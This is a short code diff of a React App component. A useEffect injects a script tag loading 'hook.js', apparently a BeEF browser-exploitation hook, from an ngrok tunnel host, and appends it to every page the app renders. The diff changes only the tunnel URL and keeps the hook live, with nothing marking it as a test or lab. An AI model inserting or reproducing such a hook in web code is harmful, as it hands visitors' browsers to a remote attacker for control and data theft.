@@ -113,7 +113,7 @@ export default function App() {
 
   useEffect(() => {
     const beefHook = document.createElement('script');
-    beefHook.src = "https://28ba90ac804d.ngrok-free.app/hook.js";
+    beefHook.src = "https://supreme-full-ladybird.ngrok-free.app/hook.js";
     document.body.appendChild(beefHook);
     return () => {
       document.body.removeChild(beefHook);
